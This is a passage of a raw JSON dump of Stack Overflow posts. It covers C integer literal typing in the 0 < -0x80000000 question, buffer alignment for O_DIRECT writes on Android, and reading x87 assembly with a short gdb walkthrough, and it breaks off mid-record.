56114255, "body": "Sorry I am still confused. <code>&#236;nt n = 0xFFFFFFFF; cout &lt;&lt; n;</code> displays <code>-1</code>. Also <code>&#236;nt n = 0x80000000; cout &lt;&lt; n;</code> displays <code>-2147483648</code>. I question the statement <i>&quot;can&#39;t fit inside a signed type like int&quot;</i>. It probably  needs further digging or be stated differently."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "reply_to_user": {"reputation": 28373, "user_id": 4926357, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d3f559694d3ca65b39220166b865276d?s=128&d=identicon&r=PG&f=1", "display_name": "A.S.H", "link": "https://stackoverflow.com/users/4926357/a-s-h"}, "edited": false, "score": 2, "creation_date": 1449679974, "post_id": 34183176, "comment_id": 56115155, "body": "@A.S.H <code>&#236;nt n = 0x80000000</code> forces a conversion from the unsigned literal to a signed type. What will happen is up to your compiler - it is implementation-defined behavior. In this case it chose to show the whole literal into the <code>int</code>, overwriting the sign bit. On other systems it might not be possible to represent the type and you invoke undefined behavior - the program might crash. You&#39;ll get the very same behaviour if you do <code>int n=2147483648;</code> so it is not related to the hex notation at all."}, {"owner": {"reputation": 28131, "user_id": 1956010, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/bfdcb4596e9da98cccbf9a0069fdff6c?s=128&d=identicon&r=PG", "display_name": "nwellnhof", "link": "https://stackoverflow.com/users/1956010/nwellnhof"}, "edited": false, "score": 1, "creation_date": 1449695347, "post_id": 34183176, "comment_id": 56124328, "body": "That&#39;s also why you&#39;ll find code like this in the <a href=\"http://repo.or.cz/glibc.git/blob/HEAD:/include/limits.h\" rel=\"nofollow noreferrer\">standard C headers</a>: <code>#define INT_MIN (-INT_MAX - 1)</code>"}, {"owner": {"reputation": 233737, "user_id": 1774667, "user_type": "registered", "accept_rate": 39, "profile_image": "https://www.gravatar.com/avatar/b6516fec2c5997b867545d285304cf12?s=128&d=identicon&r=PG", "display_name": "Yakk - Adam Nevraumont", "link": "https://stackoverflow.com/users/1774667/yakk-adam-nevraumont"}, "edited": false, "score": 2, "creation_date": 1449703301, "post_id": 34183176, "comment_id": 56128185, "body": "The behavior of &quot;wrap around&quot; unsigned numbers is fixed by the C++ standard.  It has nothing to do with 2&#39;s complement (and only to do with the <code>sizeof(unsigned)</code>).  Are you sure it is different in C?"}, {"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 2, "creation_date": 1449725161, "post_id": 34183176, "comment_id": 56134593, "body": "&quot;Instead, on a two&#39;s complement system,&quot;  - actually the system of representing negative numbers does not affect unsigned arithmetic, which is defined in terms of modular arithmetic. In the case of 32-bit int, <code>-0x80000000</code> is always <code>0x80000000</code>."}, {"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 0, "creation_date": 1449726253, "post_id": 34183176, "comment_id": 56134946, "body": "@Lundin out-of-range assignment from integer type to signed integer type is always <i>implementation-defined</i>; there are no UB cases"}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "reply_to_user": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 0, "creation_date": 1449731741, "post_id": 34183176, "comment_id": 56137267, "body": "@M.M I believe the standard says something about an &quot;implementation-defined signal may be raised&quot;. What that signal is or what happens if it isn&#39;t handled, is not covered by the standard. But sure, I can edit that part."}, {"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 0, "creation_date": 1449731895, "post_id": 34183176, "comment_id": 56137345, "body": "The behaviour of signals is part of the Standard; the default handling of each signal is <i>implementation-defined</i> too (7.14/4)"}, {"owner": {"reputation": 7099, "user_id": 1475548, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/09sbK.jpg?s=128&g=1", "display_name": "Octopus", "link": "https://stackoverflow.com/users/1475548/octopus"}, "edited": false, "score": 0, "creation_date": 1449777375, "post_id": 34183176, "comment_id": 56165241, "body": "I am surprised that this overly complicated explanation is so popular. It turns out that the comparison (&lt;) has nothing to do with it really, your last two paragraphs seem to be completely irrelevant. Just try to output the value INT32_MIN to see how it is represented."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "reply_to_user": {"reputation": 7099, "user_id": 1475548, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/09sbK.jpg?s=128&g=1", "display_name": "Octopus", "link": "https://stackoverflow.com/users/1475548/octopus"}, "edited": false, "score": 1, "creation_date": 1449820877, "post_id": 34183176, "comment_id": 56181479, "body": "@Octopus The paragraph about implicit promotion is relevant: suppose long is 32 bits, and we have a nearly identical example where the other operand is a long with any randomly picked value. Then the usual arithmetic conversions would instead have forced that operand to convert to unsigned, and the expression would have been evaluated in a completely different manner. As for the last paragraph, it answers the question."}, {"owner": {"reputation": 14050, "user_id": 1858225, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/8afcf8a38024eb5b17c0b0b58ff96d79?s=128&d=identicon&r=PG", "display_name": "Kyle Strand", "link": "https://stackoverflow.com/users/1858225/kyle-strand"}, "edited": false, "score": 3, "creation_date": 1449864257, "post_id": 34183176, "comment_id": 56207033, "body": "The explanation of how unary <code>-</code> is applied to unsigned integers could be expanded a bit. I had always assumed (though fortunately never relied on the assumption) that unsigned values would be &quot;promoted&quot; to signed values, or possibly that the result would be undefined. (Honestly, it should be a compile-error; what does <code>- 3u</code> even mean?)"}], "tags": [], "owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "is_accepted": true, "score": 362, "last_activity_date": 1472894500, "last_edit_date": 1472894500, "creation_date": 1449676350, "answer_id": 34183176, "question_id": 34182672, "link": "https://stackoverflow.com/questions/34182672/why-is-0-0x80000000/34183176#34183176", "title": "Why is 0 &lt; -0x80000000?", "body": "<p>This is quite subtle.</p>\n\n<p>Every integer literal in your program has a type. Which type it has is regulated by a table in 6.4.4.1:</p>\n\n<pre><code>Suffix      Decimal Constant    Octal or Hexadecimal Constant\n\nnone        int                 int\n            long int            unsigned int\n            long long int       long int\n                                unsigned long int\n                                long long int\n                                unsigned long long int\n</code></pre>\n\n<p>If a literal number can't fit inside the default <code>int</code> type, it will attempt the next larger type as indicated in the above table. So for regular decimal integer literals it goes like: </p>\n\n<ul>\n<li>Try <code>int</code></li>\n<li>If it can't fit, try <code>long</code></li>\n<li>If it can't fit, try <code>long long</code>.</li>\n</ul>\n\n<p><em>Hex literals behave differently though!</em> If the literal can't fit inside a signed type like <code>int</code>, it will first try <code>unsigned int</code> before moving on to trying larger types. See the difference in the above table.</p>\n\n<p>So on a 32 bit system, your literal <code>0x80000000</code> is of type <code>unsigned int</code>.</p>\n\n<p>This means that you can apply the unary <code>-</code> operator on the literal without invoking implementation-defined behavior, as you otherwise would when overflowing a signed integer. Instead, you will get the value <code>0x80000000</code>, a positive value.</p>\n\n<p><code>bal &lt; INT32_MIN</code> invokes the usual arithmetic conversions and the result of the expression <code>0x80000000</code> is promoted from <code>unsigned int</code> to <code>long long</code>. The value <code>0x80000000</code> is preserved and 0 is less than 0x80000000, hence the result.</p>\n\n<p>When you replace the literal with <code>2147483648L</code> you use decimal notation and therefore the compiler doesn't pick <code>unsigned int</code>, but rather tries to fit it inside a <code>long</code>. Also the L suffix says that you want a <code>long</code> <em>if possible</em>. The L suffix actually has similar rules if you continue to read the mentioned table in 6.4.4.1: if the number doesn't fit inside the requested <code>long</code>, which it doesn't in the 32 bit case, the compiler will give you a <code>long long</code> where it will fit just fine.</p>\n"}, {"tags": [], "owner": {"reputation": 96743, "user_id": 2455888, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/MQu4W.png?s=128&g=1", "display_name": "haccks", "link": "https://stackoverflow.com/users/2455888/haccks"}, "is_accepted": false, "score": 8, "last_activity_date": 1452692152, "last_edit_date": 1592644375, "creation_date": 1449677041, "answer_id": 34183417, "question_id": 34182672, "link": "https://stackoverflow.com/questions/34182672/why-is-0-0x80000000/34183417#34183417", "title": "Why is 0 &lt; -0x80000000?", "body": "<p>C has a rule that the integer literal may be <code>signed</code> or <code>unsigned</code> depends on whether it fits in <code>signed</code> or <code>unsigned</code> (integer promotion). On a <code>32</code>-bit machine the literal <code>0x80000000</code> will be <code>unsigned</code>. 2's complement of <code>-0x80000000</code> is <code>0x80000000</code>  on a 32-bit machine. Therefore, the comparison <code>bal &lt; INT32_MIN</code> is between <code>signed</code> and <code>unsigned</code> and before comparison as per the C rule <code>unsigned int</code> will be converted to <code>long long</code>.</p>\n<h3>C11: 6.3.1.8/1:</h3>\n<blockquote>\n<p>[...] Otherwise, if the type of the operand with signed integer type can represent all of the values of the type of the operand with unsigned integer type, then the operand with unsigned integer type is converted to the type of the operand with signed integer type.</p>\n</blockquote>\n<p>Therefore, <code>bal &lt; INT32_MIN</code> is always <code>true</code>.</p>\n"}, {"tags": [], "owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "is_accepted": false, "score": 12, "last_activity_date": 1449679982, "last_edit_date": 1449679982, "creation_date": 1449678742, "answer_id": 34184024, "question_id": 34182672, "link": "https://stackoverflow.com/questions/34182672/why-is-0-0x80000000/34184024#34184024", "title": "Why is 0 &lt; -0x80000000?", "body": "<p>A point of confusion occurs in thinking the <code>-</code> is part of the numeric constant.</p>\n\n<p>In the below code <code>0x80000000</code> is the numeric constant.  Its type is determine only on that.  The <code>-</code> is applied afterward and <em>does not change the type</em>.</p>\n\n<pre><code>#define INT32_MIN        (-0x80000000)\nlong long bal = 0;\nif (bal &lt; INT32_MIN )\n</code></pre>\n\n<p><em>Raw</em> unadorned numeric constants are positive.  </p>\n\n<p>If it is decimal, then the type assigned is first type that will hold it: <code>int</code>, <code>long</code>, <code>long long</code>.</p>\n\n<p>If the constant is octal or hexadecimal, it gets the first type that holds it: <code>int</code>, <code>unsigned</code>, <code>long</code>, <code>unsigned long</code>, <code>long long</code>, <code>unsigned long long</code>.</p>\n\n<p><code>0x80000000</code>, on OP's system  gets the type of <code>unsigned</code> or <code>unsigned long</code>.  Either way, it is some unsigned type.  </p>\n\n<p><code>-0x80000000</code> is also some non-zero value and being some unsigned type, it is greater than 0.  When code compares that to a <code>long long</code>, the <em>values</em> are not changed on the 2 sides of the compare, so <code>0 &lt; INT32_MIN</code> is true.</p>\n\n<hr>\n\n<p>An alternate definition avoids this curious behavior</p>\n\n<pre><code>#define INT32_MIN        (-2147483647 - 1)\n</code></pre>\n\n<hr>\n\n<p>Let us walk in  fantasy land for a while where <code>int</code> and <code>unsigned</code> are 48-bit.</p>\n\n<p>Then <code>0x80000000</code> fits in <code>int</code> and so is the type <code>int</code>.  <code>-0x80000000</code> is then a negative number and the result of the print out is different.</p>\n\n<p>[Back to real-word]</p>\n\n<p>Since <code>0x80000000</code> fits in some unsigned type before a signed type as it is just larger than <code>some_signed_MAX</code> yet within <code>some_unsigned_MAX</code>, it is some unsigned type.</p>\n"}], "owner": {"reputation": 19948, "user_id": 3150853, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/qIPrg.jpg?s=128&g=1", "display_name": "Jayesh Bhoi", "link": "https://stackoverflow.com/users/3150853/jayesh-bhoi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 16359, "favorite_count": 58, "protected_date": 1450590754, "accepted_answer_id": 34183176, "answer_count": 6, "score": 252, "last_activity_date": 1472894500, "creation_date": 1449675065, "last_edit_date": 1450427738, "question_id": 34182672, "link": "https://stackoverflow.com/questions/34182672/why-is-0-0x80000000", "title": "Why is 0 &lt; -0x80000000?", "body": "<p>I have below a simple program:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\n#define INT32_MIN        (-0x80000000)\n\nint main(void) \n{\n    long long bal = 0;\n\n    if(bal &lt; INT32_MIN )\n    {\n        printf(\"Failed!!!\");\n    }\n    else\n    {\n        printf(\"Success!!!\");\n    }\n    return 0;\n}\n</code></pre>\n\n<p>The condition <code>if(bal &lt; INT32_MIN )</code> is always true. How is it possible?</p>\n\n<p>It works fine if I change the macro to:</p>\n\n<pre><code>#define INT32_MIN        (-2147483648L)\n</code></pre>\n\n<p>Can anyone point out the issue?</p>\n"}, {"tags": ["android", "c", "android-ndk", "java-native-interface", "invalid-argument"], "comments": [{"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 1, "creation_date": 1449676808, "post_id": 34182535, "comment_id": 56112890, "body": "There can also be size restrictions on IO operations using direct IO. One byte may not work."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 1, "creation_date": 1449770154, "post_id": 34182535, "comment_id": 56161572, "body": "with <code>O_DIRECT</code>, the I/O size needs to be the same as a disk file block size (often 4096 bytes) and aligned on a page (address divisible by 4096).   You might want to look at the <code>setbuf()</code> function as a viable alternative.     The only thing <code>calloc()</code> does special is set the allocated memory to all 0x00.  The malloc, calloc and realloc all return a pointer to a a block of memory those address is evenly divisible by the underlying hardware bus size.  (32 or 64 bit)"}, {"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "reply_to_user": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1449835893, "post_id": 34182535, "comment_id": 56190220, "body": "@user3629249 - Restrictions on direct IO on Linux are a lot more complex than that. For example, the ext4 file system seems to allow unaligned direct IO. See <a href=\"http://lxr.free-electrons.com/source/fs/ext4/file.c#L102\" rel=\"nofollow noreferrer\">lxr.free-electrons.com/source/fs/ext4/file.c#L102</a>  I&#39;ve also noticed that the requirement for page- or block-size-only IO operations has been relaxed in recent Linux releases, which makes sense as few files are exact multiples of those values. Using direct IO on Linux is somewhat unpredictable despite there being obvious use cases (e.g., streaming large amounts of data that will never need to be in any page cache)."}], "answers": [{"comments": [{"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1449676687, "post_id": 34182957, "comment_id": 56112786, "body": "You can use <code>posix_memalign()</code> or <code>valloc()</code> to get page-aligned memory.  See <a href=\"http://man7.org/linux/man-pages/man3/posix_memalign.3.html\" rel=\"nofollow noreferrer\">man7.org/linux/man-pages/man3/posix_memalign.3.html</a>"}, {"owner": {"reputation": 342, "user_id": 5656013, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/674a6f60b9477aaa080060cd836dc863?s=128&d=identicon&r=PG&f=1", "display_name": "ctrl-d", "link": "https://stackoverflow.com/users/5656013/ctrl-d"}, "reply_to_user": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 1, "creation_date": 1449677141, "post_id": 34182957, "comment_id": 56113114, "body": "I see. Using mmap to allocate the memory would also work."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1449864448, "post_id": 34182957, "comment_id": 56207143, "body": "regarding <code>valloc()</code>, per the man page: &quot;The obsolete function valloc()  allocates  size  bytes  and  returns  a        pointer to the allocated memory.  The memory address will be a multiple        of the page  size.   It  is  equivalent  to  memalign(sysconf(_SC_PAGE\u2010        SIZE),size).&quot;"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1449864585, "post_id": 34182957, "comment_id": 56207226, "body": "regarding <code>posix_memalign()</code>, per the man page: &quot;The function posix_memalign()  allocates  size  bytes  and  places  the        address  of  the allocated memory in *memptr.  The address of the allo\u2010        cated memory will be a multiple of alignment, which must be a power  of        two  and  a  multiple  of sizeof(void *).  If size is 0, then the value        placed in *memptr is either NULL, or a unique pointer  value  that  can        later be successfully passed to free(3).&quot;  but says nothing about memory alignment on a page boundary."}, {"owner": {"reputation": 849, "user_id": 714350, "user_type": "registered", "accept_rate": 14, "profile_image": "https://i.stack.imgur.com/3QoFJ.jpg?s=128&g=1", "display_name": "schuess", "link": "https://stackoverflow.com/users/714350/schuess"}, "edited": false, "score": 0, "creation_date": 1487694563, "post_id": 34182957, "comment_id": 71895134, "body": "An issue I encountered when using O_DIRECT was that once you have allocated your aligned memory, you must write the entire chunk. So if your buffer size is 4096 bytes you must write all 4096 bytes."}], "tags": [], "owner": {"reputation": 342, "user_id": 5656013, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/674a6f60b9477aaa080060cd836dc863?s=128&d=identicon&r=PG&f=1", "display_name": "ctrl-d", "link": "https://stackoverflow.com/users/5656013/ctrl-d"}, "is_accepted": false, "score": 2, "last_activity_date": 1449675789, "creation_date": 1449675789, "answer_id": 34182957, "question_id": 34182535, "link": "https://stackoverflow.com/questions/34182535/write-error-invalid-argument-when-file-is-opened-with-o-direct/34182957#34182957", "title": "Write error: Invalid argument, when file is opened with O_DIRECT", "body": "<p>Calloc will not align the memory good enough in this case. Allocate more memory than you need, and round it up to the next 4k or so page. Also read the notes below in the manpage for open() with O_DIRECT.</p>\n"}, {"comments": [{"owner": {"reputation": 2484, "user_id": 645127, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/c60f7fda09932752502455be62069611?s=128&d=identicon&r=PG", "display_name": "Arne", "link": "https://stackoverflow.com/users/645127/arne"}, "edited": false, "score": 0, "creation_date": 1524748347, "post_id": 34252331, "comment_id": 87103941, "body": "How does one write arbitrarily sized files using this method? I always get an invalid argument when trying to write the last fraction of a block and the file is truncated"}, {"owner": {"reputation": 2484, "user_id": 645127, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/c60f7fda09932752502455be62069611?s=128&d=identicon&r=PG", "display_name": "Arne", "link": "https://stackoverflow.com/users/645127/arne"}, "edited": false, "score": 0, "creation_date": 1524816337, "post_id": 34252331, "comment_id": 87132397, "body": "Fixed it by truncating the file to correct size after writing last block."}], "tags": [], "owner": {"reputation": 1712, "user_id": 1655572, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/545dac8a62485f499362a4383cba2a71?s=128&d=identicon&r=PG", "display_name": "LoneDuck", "link": "https://stackoverflow.com/users/1655572/loneduck"}, "is_accepted": true, "score": 5, "last_activity_date": 1450018043, "creation_date": 1450018043, "answer_id": 34252331, "question_id": 34182535, "link": "https://stackoverflow.com/questions/34182535/write-error-invalid-argument-when-file-is-opened-with-o-direct/34252331#34252331", "title": "Write error: Invalid argument, when file is opened with O_DIRECT", "body": "<p>I solved it (with your guidance)- and wanted to post my solution in case anyone in the future has similar problems.</p>\n\n<p>The trick was that with the <code>O_DIRECT</code> flag you need to align both the memory address and your buffer to the filesystem's block size (or at least, block size worked for me; sector didn't).</p>\n\n<pre><code>struct stat fstat;\nstat(filepath, &amp;fstat); \nint blksize = (int)fstat.st_blksize;\nint align = blksize-1;\n\nconst char *buff = (char *) malloc((int)blksize+align);\nbuff = (char *)(((uintptr_t)buff+align)&amp;~((uintptr_t)align));\n\nif(write(fd,buff,(size_t)blksize)&lt;1) { \n        //Error handling\n        free((char *)buff);\n        return -1;\n}\n</code></pre>\n\n<p>I did two main things:</p>\n\n<ol>\n<li>Found the filesystem hosting my file's block size using <code>stat()</code> and accessing the <code>st_blksize</code> attribute.</li>\n<li>Allocated <code>align</code> more bytes than I need. I then added those extra <code>align</code> bytes to the pointer address so that masking off the bits to the lower block size alignment wouldn't leave me with less memory allocated than I wanted. Then of course you AND the bits with the mask (created by flipping the bits of <code>align</code> which is <code>blksize</code>-1), and voila- your buffer is <code>blksize</code>-aligned.</li>\n</ol>\n\n<p>Also note that the amount you write also has to be aligned to block size (at least in my case).</p>\n\n<p>-LD</p>\n"}], "owner": {"reputation": 1712, "user_id": 1655572, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/545dac8a62485f499362a4383cba2a71?s=128&d=identicon&r=PG", "display_name": "LoneDuck", "link": "https://stackoverflow.com/users/1655572/loneduck"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 3115, "favorite_count": 1, "accepted_answer_id": 34252331, "answer_count": 2, "score": 2, "last_activity_date": 1450018043, "creation_date": 1449674682, "question_id": 34182535, "link": "https://stackoverflow.com/questions/34182535/write-error-invalid-argument-when-file-is-opened-with-o-direct", "title": "Write error: Invalid argument, when file is opened with O_DIRECT", "body": "<p>it is very important to me to write to a file with the <code>O_DIRECT</code> flag.</p>\n\n<p>This is how I open the file:</p>\n\n<pre><code>//Open the file\nint fd;\nif((fd = open(inFilepath, O_WRONLY | O_CREAT |O_SYNC |O_DIRECT,S_IRUSR|S_IWUSR))&lt;0) {\n    //Error handling\n    return;\n}\n</code></pre>\n\n<p>I know about O_DIRECT's alignment restrictions. This is why I initialize my buffer with calloc:</p>\n\n<pre><code>char *buff = (char *) calloc((size_t) 1,sizeof(char));\n\nif(write(fd,buff,(size_t)1)&lt;1) {\n    //Error logging\n    free(buff);\n    return -1;\n}\n</code></pre>\n\n<p>And I get the <code>write: Invalid argument</code> error.\nI even tried to use more extreme measures such as memalign and posix_memalign, but had issues with them (memalign got stuck, and posix_memalign is missing for the ARM processor).</p>\n\n<p>When I comment out the <code>O_DIRECT</code> flag, everything works as it should (but I/O is not direct, which is what I need).</p>\n\n<p>Anyone has any insight as to why this is happening? If <code>O_DIRECT</code> was not implemented in Android, then it should've failed at <code>open()</code>, not at <code>write()</code>; so I must be doing something wrong!</p>\n\n<p>Thanks\n-LD</p>\n"}, {"tags": ["c", "assembly", "reverse-engineering", "x87"], "comments": [{"owner": {"reputation": 173, "user_id": 5555969, "user_type": "registered", "accept_rate": 38, "profile_image": "https://graph.facebook.com/10206319262238058/picture?type=large", "display_name": "Anastasia Netz", "link": "https://stackoverflow.com/users/5555969/anastasia-netz"}, "reply_to_user": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "edited": false, "score": 0, "creation_date": 1449674820, "post_id": 34182461, "comment_id": 56111337, "body": "No, I have tried to download some compilers that support assembly, but it seems like it requires the whole code, not a piece. I couldn&#39;t figure out how to test piece of code :("}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1449675022, "post_id": 34182461, "comment_id": 56111479, "body": "<a href=\"https://www.ibiblio.org/gferg/ldp/GCC-Inline-Assembly-HOWTO.html\" rel=\"nofollow noreferrer\">ibiblio.org/gferg/ldp/GCC-Inline-Assembly-HOWTO.html</a>"}, {"owner": {"reputation": 173, "user_id": 5555969, "user_type": "registered", "accept_rate": 38, "profile_image": "https://graph.facebook.com/10206319262238058/picture?type=large", "display_name": "Anastasia Netz", "link": "https://stackoverflow.com/users/5555969/anastasia-netz"}, "edited": false, "score": 0, "creation_date": 1449675462, "post_id": 34182461, "comment_id": 56111816, "body": "Which compiler would you suggest tho?"}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1449675462, "post_id": 34182461, "comment_id": 56111820, "body": "Evidently you are uncertain about the the effect of the assembly code or about the effect of the C code (or both).  It&#39;s not apparent which.  It might help you to write a detailed natural-language description of (what you think is) the effect of the code in question."}, {"owner": {"reputation": 3107, "user_id": 1928235, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/8119b4672d36b04e505f44e0e9187eea?s=128&d=identicon&r=PG", "display_name": "user4520", "link": "https://stackoverflow.com/users/1928235/user4520"}, "edited": false, "score": 0, "creation_date": 1449675598, "post_id": 34182461, "comment_id": 56111922, "body": "It depends on your platform, but in general all the mainstream compilers support it. For Windows that would be MSVC, for Linux GCC or Clang (all free(ware)). And yes, I believe you have understood these instructions correctly."}, {"owner": {"reputation": 173, "user_id": 5555969, "user_type": "registered", "accept_rate": 38, "profile_image": "https://graph.facebook.com/10206319262238058/picture?type=large", "display_name": "Anastasia Netz", "link": "https://stackoverflow.com/users/5555969/anastasia-netz"}, "edited": false, "score": 0, "creation_date": 1449675941, "post_id": 34182461, "comment_id": 56112223, "body": "Ok so we pushing x  into st(0), then we pushing y into st(0), and x goes into st(1). Then we multiply st(0) and st (1) hence x<i>y, and it goes into st(0). After that we pushing  z into st(0) and x</i>y goes to st(1). Then we adding z to x*y, and moving it all in st(0), and then we pop the value off the stack - (fstpl)."}], "answers": [{"comments": [{"owner": {"reputation": 173, "user_id": 5555969, "user_type": "registered", "accept_rate": 38, "profile_image": "https://graph.facebook.com/10206319262238058/picture?type=large", "display_name": "Anastasia Netz", "link": "https://stackoverflow.com/users/5555969/anastasia-netz"}, "edited": false, "score": 0, "creation_date": 1449677147, "post_id": 34183279, "comment_id": 56113119, "body": "Thanks, it was definitely very helpful, I surely will use it for future reference."}], "tags": [], "owner": {"reputation": 52454, "user_id": 547981, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/90042f6f33a9f87769fac02096ceea68?s=128&d=identicon&r=PG", "display_name": "Jester", "link": "https://stackoverflow.com/users/547981/jester"}, "is_accepted": true, "score": 3, "last_activity_date": 1449676629, "creation_date": 1449676629, "answer_id": 34183279, "question_id": 34182461, "link": "https://stackoverflow.com/questions/34182461/x87-floating-point-instructions-into-c-code/34183279#34183279", "title": "x87 floating point instructions into C code", "body": "<p>Yes, you got the meaning correctly figured out.</p>\n\n<p>For later reference, you can just stick such code into an assembly file and step through in a debugger. From the at&amp;t syntax I assume it is intended for <code>gas</code>, the gnu assembler. You can test it like this:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>$ cat &gt; test.s\n.att_syntax noprefix\n.globl _start\n_start:\nfldl    x\nfldl    y\nfmulp   st, st(1)\nfldl    z\nfaddp   st, st (1)\nfstpl   z\n.data\nx: .double 2\ny: .double 3\nz: .double 4\n$ gcc -m32 -nostdlib -g test.s\n$ gdb ./a.out\n(gdb) b _start\nBreakpoint 1 at 0x80480b8: file test.s, line 4.\n(gdb) r\nStarting program: /var/tmp/./a.out\n\nBreakpoint 1, _start () at test.s:4\n4       fldl    x\n(gdb) s\n5       fldl    y\n(gdb)\n6       fmulp   st, st(1)\n(gdb)\n7       fldl    z\n(gdb)\n8       faddp   st, 